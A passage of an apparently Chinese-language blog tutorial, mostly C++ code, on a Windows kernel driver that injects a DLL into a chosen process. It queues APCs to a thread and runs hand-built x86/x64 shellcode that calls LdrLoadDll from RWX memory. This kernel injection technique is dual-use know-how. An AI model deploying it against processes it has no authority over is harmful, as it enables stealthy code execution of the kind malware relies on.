MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">NT_SUCCESS</span>(Status))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 准备完整路径</span></span><br><span class="line">PUNICODE_STRING32 v1 = &amp;RemoteBufferData-&gt;DllFullPath32;</span><br><span class="line">v1-&gt;Length = DllFullPath-&gt;Length;</span><br><span class="line">v1-&gt;MaximumLength = DllFullPath-&gt;MaximumLength;</span><br><span class="line">v1-&gt;Buffer = (ULONG)(ULONG_PTR)RemoteBufferData-&gt;BufferData;</span><br><span class="line"><span class="built_in">memcpy</span>((PVOID)v1-&gt;Buffer, DllFullPath-&gt;Buffer, DllFullPath-&gt;Length);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 准备ShellCode</span></span><br><span class="line"><span class="built_in">memcpy</span>(RemoteBufferData-&gt;ShellCode, ShellCode, <span class="built_in">sizeof</span>(ShellCode));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 填充结构所需要的参数</span></span><br><span class="line">*(ULONG*)((PUCHAR)RemoteBufferData + <span class="number">1</span>) = (ULONG)(ULONG_PTR)&amp;RemoteBufferData-&gt;ModuleBase;</span><br><span class="line">*(ULONG*)((PUCHAR)RemoteBufferData + <span class="number">6</span>) = (ULONG)(ULONG_PTR)v1;</span><br><span class="line">*(ULONG*)((PUCHAR)RemoteBufferData + <span class="number">15</span>) = (ULONG)((ULONG_PTR)LdrLoadDll - ((ULONG_PTR)RemoteBufferData + <span class="number">15</span>) - <span class="number">5</span> + <span class="number">1</span>);</span><br><span class="line">*(ULONG*)((PUCHAR)RemoteBufferData + <span class="number">20</span>) = (ULONG)(ULONG_PTR)&amp;RemoteBufferData-&gt;CallComplete;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> RemoteBufferData;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>x64</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">PINJECTION_DATA <span class="title">GetNativeCode</span><span class="params">(IN PVOID LdrLoadDll, IN PUNICODE_STRING DllFullPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">NTSTATUS Status = STATUS_SUCCESS;</span><br><span class="line">PINJECTION_DATA RemoteBufferData = <span class="literal">NULL</span>;</span><br><span class="line">SIZE_T RemoteBufferLength = PAGE_SIZE;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Code</span></span><br><span class="line">UCHAR ShellCode[] =</span><br><span class="line">&#123;</span><br><span class="line"><span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xEC</span>, <span class="number">0x28</span>,                 <span class="comment">// sub rsp, 0x28</span></span><br><span class="line"><span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xC9</span>,                       <span class="comment">// xor rcx, rcx</span></span><br><span class="line"><span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xD2</span>,                       <span class="comment">// xor rdx, rdx</span></span><br><span class="line"><span class="number">0x49</span>, <span class="number">0xB8</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,     <span class="comment">// mov r8, ModuleFileName   offset +12</span></span><br><span class="line"><span class="number">0x49</span>, <span class="number">0xB9</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,     <span class="comment">// mov r9, ModuleHandle     offset +28</span></span><br><span class="line"><span class="number">0x48</span>, <span class="number">0xB8</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,     <span class="comment">// mov rax, LdrLoadDll      offset +32</span></span><br><span class="line"><span class="number">0xFF</span>, <span class="number">0xD0</span>,                             <span class="comment">// call rax</span></span><br><span class="line"><span class="number">0x48</span>, <span class="number">0xBA</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,     <span class="comment">// mov rdx, COMPLETE_OFFSET offset +44</span></span><br><span class="line"><span class="number">0xC7</span>, <span class="number">0x02</span>, <span class="number">0x7E</span>, <span class="number">0x1E</span>, <span class="number">0x37</span>, <span class="number">0xC0</span>,     <span class="comment">// mov [rdx], CALL_COMPLETE                  //APC使用</span></span><br><span class="line"><span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xC4</span>, <span class="number">0x28</span>,                 <span class="comment">// add rsp, 0x28</span></span><br><span class="line"><span class="number">0xC3</span>                                    <span class="comment">// ret</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Status = <span class="built_in">ZwAllocateVirtualMemory</span>(<span class="built_in">ZwCurrentProcess</span>(), &amp;RemoteBufferData, <span class="number">0</span>, &amp;RemoteBufferLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">NT_SUCCESS</span>(Status))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Copy path</span></span><br><span class="line">PUNICODE_STRING v1 = &amp;RemoteBufferData-&gt;DllFullPath;</span><br><span class="line">v1-&gt;Length = <span class="number">0</span>;</span><br><span class="line">v1-&gt;MaximumLength = <span class="built_in">sizeof</span>(RemoteBufferData-&gt;BufferData);</span><br><span class="line">v1-&gt;Buffer = RemoteBufferData-&gt;BufferData;</span><br><span class="line"></span><br><span class="line"><span class="built_in">RtlUnicodeStringCopy</span>(v1, DllFullPath);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Copy code</span></span><br><span class="line"><span class="built_in">memcpy</span>(RemoteBufferData-&gt;ShellCode, ShellCode, <span class="built_in">sizeof</span>(ShellCode));</span><br><span class="line"></span><br><span class="line"><span class="comment">// Fill stubs</span></span><br><span class="line">*(ULONGLONG*)((PUCHAR)RemoteBufferData + <span class="number">12</span>) = (ULONGLONG)v1;</span><br><span class="line">*(ULONGLONG*)((PUCHAR)RemoteBufferData + <span class="number">22</span>) = (ULONGLONG)&amp;RemoteBufferData-&gt;ModuleBase;</span><br><span class="line">*(ULONGLONG*)((PUCHAR)RemoteBufferData + <span class="number">32</span>) = (ULONGLONG)LdrLoadDll;</span><br><span class="line">*(ULONGLONG*)((PUCHAR)RemoteBufferData + <span class="number">44</span>) = (ULONGLONG)&amp;RemoteBufferData-&gt;CallComplete;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> RemoteBufferData;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="开始APC注入"><a href="#开始APC注入" class="headerlink" title="开始APC注入"></a>开始APC注入</h4><ol><li>获取一个线程，取出EThread</li><li>插入线程的APC队列中</li><li>等待完成</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">ApcInjection</span><span class="params">(IN PINJECTION_DATA InjectionData, IN HANDLE TargetProcessID)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//最后两个参数可以</span></span><br><span class="line">NTSTATUS Status = STATUS_SUCCESS;</span><br><span class="line">PETHREAD EThread = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取活跃线程（主线程）</span></span><br><span class="line">Status = <span class="built_in">SeLookupProcessThread</span>(TargetProcessID, &amp;EThread);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">NT_SUCCESS</span>(Status))</span><br><span class="line">&#123;</span><br><span class="line">        <span class="comment">// 插入APC队列</span></span><br><span class="line">Status = <span class="built_in">SeQueueUserApc</span>(EThread, InjectionData, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, TRUE);  <span class="comment">//内核情景分析 358</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 等待完成</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">NT_SUCCESS</span>(Status))   <span class="comment">//该代码待定</span></span><br><span class="line">&#123;</span><br><span class="line">LARGE_INTEGER Interval = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">Interval.QuadPart = -(<span class="number">5LL</span> * <span class="number">10</span> * <span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 等待</span></span><br><span class="line"><span class="keyword">for</span> (ULONG i = <span class="number">0</span>; InjectionData-&gt;CallComplete != CALL_COMPLETE &amp;&amp; i &lt; <span class="number">10000</span>; i++)</span><br><span class="line"><span class="built_in">KeDelayExecutionThread</span>(KernelMode, FALSE, &amp;Interval);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">DbgPrint</span>(<span class="string">&quot;Failed To Locate Thread\r\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (EThread)</span><br><span class="line"><span class="built_in">ObDereferenceObject</span>(EThread);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> Status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="获取活跃线程"><a href="#获取活跃线程" class="headerlink" title="获取活跃线程"></a>获取活跃线程</h4><ol><li>获取进程的线程列表</li><li>过滤当前线程，并在SystemProcessInfo里取出一个线程ID获取EThread</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">SeLookupProcessThread</span><span class="params">(IN HANDLE ProcessID, OUT PETHREAD* EThread)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">NTSTATUS Status = STATUS_SUCCESS;</span><br><span class="line">PVOID BufferData = <span class="built_in">ExAllocatePool</span>(NonPagedPool, <span class="number">1024</span> * <span class="number">1024</span>);</span><br><span class="line">PSYSTEM_PROCESS_INFORMATION SystemProcessInfo = (PSYSTEM_PROCESS_INFORMATION)BufferData;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (EThread == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> STATUS_INVALID_PARAMETER;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!SystemProcessInfo)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">DbgPrint</span>(<span class="string">&quot;Failed To Allocate Memory For Process List\r\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> STATUS_NO_MEMORY;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取进程的线程列表</span></span><br><span class="line">Status = <span class="built_in">ZwQuerySystemInformation</span>(SystemProcessInformation, SystemProcessInfo, <span class="number">1024</span> * <span class="number">1024</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(Status))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">ExFreePool</span>(BufferData);</span><br><span class="line"><span class="keyword">return</span> Status;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 找到目标线程</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">NT_SUCCESS</span>(Status))</span><br><span class="line">&#123;</span><br><span class="line">Status = STATUS_NOT_FOUND;</span><br><span class="line"><span class="keyword">for</span> (;;)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (SystemProcessInfo-&gt;UniqueProcessId == ProcessID)</span><br><span class="line">&#123;</span><br><span class="line">Status = STATUS_SUCCESS;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (SystemProcessInfo-&gt;NextEntryOffset)</span><br><span class="line">SystemProcessInfo = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)SystemProcessInfo + SystemProcessInfo-&gt;NextEntryOffset);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">NT_SUCCESS</span>(Status))</span><br><span class="line">&#123;</span><br><span class="line">Status = STATUS_NOT_FOUND;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (ULONG i = <span class="number">0</span>; i &lt; SystemProcessInfo-&gt;NumberOfThreads; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 跳过当前线程</span></span><br><span class="line"><span class="keyword">if</span> (</span><br><span class="line">SystemProcessInfo-&gt;Threads[i].ClientId.UniqueThread == <span class="built_in">PsGetCurrentThread</span>())</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 线程ID获取EThread</span></span><br><span class="line">Status = <span class="built_in">PsLookupThreadByThreadId</span>(SystemProcessInfo-&gt;Threads[i].ClientId.UniqueThread, EThread);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">DbgPrint</span>(<span class="string">&quot;Failed To Locate Process\r\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (BufferData)</span><br><span class="line"><span class="built_in">ExFreePool</span>(BufferData);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> Status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="插入目标线程APC队列"><a href="#插入目标线程APC队列" class="headerlink" title="插入目标线程APC队列"></a>插入目标线程APC队列</h4><ol><li>分配APC内存</li><li>初始化APC并分配执行和结束回调例程。APC回调例程中可以设置强制唤醒。执行例程就是之前的ShellCode</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">SeQueueUserApc</span><span class="params">(IN PETHREAD EThread,IN PVOID StartRoutine,IN PVOID Argument1,IN PVOID Argument2,IN PVOID Argument3,</span></span></span><br><span class="line"><span class="params"><span class="function">IN BOOLEAN IsForce)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (EThread == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> STATUS_INVALID_PARAMETER;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 分配APC内存</span></span><br><span class="line">PKAPC PrepareApc = <span class="literal">NULL</span>;</span><br><span class="line">PKAPC ExcuteApc = <span class="built_in">ExAllocatePool</span>(NonPagedPool, <span class="built_in">sizeof</span>(KAPC));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ExcuteApc == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">DbgPrint</span>(<span class="string">&quot;Failed To Allocate APC\r\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> STATUS_NO_MEMORY;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 一般APC 初始化</span></span><br><span class="line"><span class="built_in">KeInitializeApc</span>(</span><br><span class="line">ExcuteApc, (PKTHREAD)EThread,</span><br><span class="line">OriginalApcEnvironment, &amp;KernelApcExcuteCallback,</span><br><span class="line"><span class="literal">NULL</span>, (PKNORMAL_ROUTINE)(ULONG_PTR)StartRoutine, UserMode, Argument1);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 强制APC 初始化</span></span><br><span class="line"><span class="keyword">if</span> (IsForce)</span><br><span class="line">&#123;</span><br><span class="line">PrepareApc = <span class="built_in">ExAllocatePool</span>(NonPagedPool, <span class="built_in">sizeof</span>(KAPC));</span><br><span class="line"><span class="built_in">KeInitializeApc</span>(</span><br><span class="line">PrepareApc, (PKTHREAD)EThread,</span><br><span class="line">OriginalApcEnvironment, &amp;KernelApcPrepareCallback,</span><br><span class="line"><span class="literal">NULL</span>, <span class="literal">NULL</span>, KernelMode, <span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 插入APC队列</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">KeInsertQueueApc</span>(ExcuteApc, Argument2, Argument3, <span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (IsForce &amp;&amp; PrepareApc)</span><br><span class="line"><span class="built_in">KeInsertQueueApc</span>(PrepareApc, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">DbgPrint</span>(<span class="string">&quot;Failed To Insert APC\r\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">ExFreePool</span>(ExcuteApc);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (PrepareApc)</span><br><span class="line"><span class="built_in">ExFreePool</span>(ExcuteApc);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> STATUS_NOT_CAPABLE;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="APC完成回调例程"><a href="#APC完成回调例程" class="headerlink" title="APC完成回调例程"></a>APC完成回调例程</h4><p>一般情况</p><p>释放结构</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">VOID <span class="title">KernelApcExcuteCallback</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">PKAPC Apc,</span></span></span><br><span class="line"><span class="params"><span class="function">PKNORMAL_ROUTINE* NormalRoutine,</span></span></span><br><span class="line"><span class="params"><span class="function">PVOID* NormalContext,</span></span></span><br><span class="line"><span class="params"><span class="function">PVOID* SystemArgument1,</span></span></span><br><span class="line"><span class="params"><span class="function">PVOID* SystemArgument2</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">UNREFERENCED_PARAMETER</span>(SystemArgument1);</span><br><span class="line"><span class="built_in">UNREFERENCED_PARAMETER</span>(SystemArgument2);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 当前线程正在被释放</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">PsIsThreadTerminating</span>(<span class="built_in">PsGetCurrentThread</span>()))</span><br><span class="line">*NormalRoutine = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 适配WOW64</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">PsGetCurrentProcessWow64Process</span>() != <span class="literal">NULL</span>)</span><br><span class="line"><span class="built_in">PsWrapApcWow64Thread</span>(NormalContext, (PVOID*)NormalRoutine);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 释放APC结构</span></span><br><span class="line"><span class="built_in">ExFreePool</span>(Apc);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>强制情况</p><p>强行唤醒线程执行APC，释放结构</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">VOID <span class="title">KernelApcPrepareCallback</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">PKAPC Apc,</span></span></span><br><span class="line"><span class="params"><span class="function">PKNORMAL_ROUTINE* NormalRoutine,</span></span></span><br><span class="line"><span class="params"><span class="function">PVOID* NormalContext,</span></span></span><br><span class="line"><span class="params"><span class="function">PVOID* SystemArgument1,</span></span></span><br><span class="line"><span class="params"><span class="function">PVOID* SystemArgument2</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">UNREFERENCED_PARAMETER</span>(NormalRoutine);</span><br><span class="line"><span class="built_in">UNREFERENCED_PARAMETER</span>(NormalContext);</span><br><span class="line"><span class="built_in">UNREFERENCED_PARAMETER</span>(SystemArgument1);</span><br><span class="line"><span class="built_in">UNREFERENCED_PARAMETER</span>(SystemArgument2);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">KeTestAlertThread</span>(UserMode); <span class="comment">//向目标植入可提醒状态</span></span><br><span class="line"><span class="built_in">ExFreePool</span>(Apc);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="驱动卸载"><a href="#驱动卸载" class="headerlink" title="驱动卸载"></a>驱动卸载</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">VOID <span class="title">DriverUnload</span><span class="params">(PDRIVER_OBJECT DriverObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">UNICODE_STRING  DeviceLinkName;</span><br><span class="line">PDEVICE_OBJECTv1 = <span class="literal">NULL</span>;</span><br><span class="line">PDEVICE_OBJECT  DeleteDeviceObject = <span class="literal">NULL</span>;</span><br><span class="line"><span class="built_in">RtlInitUnicodeString</span>(&amp;DeviceLinkName, DEVICE_LINK_NAME);</span><br><span class="line"><span class="built_in">IoDeleteSymbolicLink</span>(&amp;DeviceLinkName);</span><br><span class="line">DeleteDeviceObject = DriverObject-&gt;DeviceObject;</span><br><span class="line"><span class="keyword">while</span> (DeleteDeviceObject != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">v1 = DeleteDeviceObject-&gt;NextDevice;</span><br><span class="line"><span class="built_in">IoDeleteDevice</span>(DeleteDeviceObject);</span><br><span class="line">DeleteDeviceObject = v1;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Ring3"><a href="#Ring3" class="headerlink" title="Ring3"></a>Ring3</h3><h4 id="主函数外的入口"><a href="#主函数外的入口" class="headerlink" title="主函数外的入口"></a>主函数外的入口</h4><ol><li>输入进程ID</li><li>获取当前可执行文件的路径，并将DllName与路径拼接起来，得到完整的DLL路径</li><li>通过链接名打开设备对象</li><li>初始化结构，发送结构体和控制码</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> DEVICE_LINK_NAME    <span class="string">L&quot;\\??\\APCInjectionLinkName&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CTL_APC_INJECTION \</span></span><br><span class="line"><span class="meta">CTL_CODE(FILE_DEVICE_UNKNOWN,0x830,METHOD_BUFFERED,FILE_ANY_ACCESS)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span 